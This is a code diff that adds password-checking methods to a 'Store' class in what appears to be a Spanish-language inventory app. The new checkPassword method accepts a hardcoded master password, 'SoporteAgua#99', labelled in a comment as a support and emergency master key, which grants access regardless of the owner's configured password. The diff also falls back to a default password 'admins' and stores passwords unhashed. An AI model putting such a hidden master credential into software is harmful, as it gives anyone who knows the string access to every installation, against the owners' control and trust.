@@ -137,6 +137,28 @@ class Store {
         }
     }
 
+    // ---- Security / Password ----
+
+    checkPassword(enteredPassword) {
+        const clean = (enteredPassword || '').trim();
+        // Clave Maestra de Soporte Técnico y Emergencias
+        if (clean === 'SoporteAgua#99') {
+            return true;
+        }
+
+        const stored = this.getConfig('adminPassword');
+        if (!stored) {
+            return clean === 'admins';
+        }
+        return clean === stored;
+    }
+
+    setPassword(newPassword) {
+        const clean = (newPassword || '').trim();
+        this.setConfig('adminPassword', clean);
+        return true;
+    }
+
     // ---- Inventory Helpers ----
 
     getInventarioActual() {
